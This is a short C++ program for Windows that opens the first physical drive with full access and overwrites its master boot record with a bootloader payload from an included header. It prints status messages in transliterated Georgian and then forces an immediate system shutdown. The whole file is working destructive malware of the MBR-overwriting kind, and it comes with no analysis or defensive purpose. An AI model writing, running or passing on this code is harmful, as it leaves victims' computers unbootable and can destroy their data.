#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include "bootloader.h"

int main()
{
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) {
        printf("Ver Gavkhsenit Draivi\n");
        return EXIT_FAILURE;
    }



    DWORD bytes_written;
    if (!WriteFile(drive, bootloader, bootloader_len, &bytes_written, NULL)) { // Dasafixia
        printf("Ver Gadavatseret MBRs\n");
    }
    else {
        printf("Tsarmatebit Gadaetsera %d Baiti MBRs\n", bytes_written);
    }
    printf("Shevetsadet Chagvetsera %u Biti, Magram Mxolod %lu Bitis Chatsera Movakherkhet.\n", bootloader_len, bytes_written);

    CloseHandle(drive);
    DWORD error_code = GetLastError();
    printf("Erorma Amogvigdo: %lu\n", error_code);
    Sleep(1000);
    system("C:\\Windows\\System32\\shutdown /s /t 0");
    return EXIT_SUCCESS;
}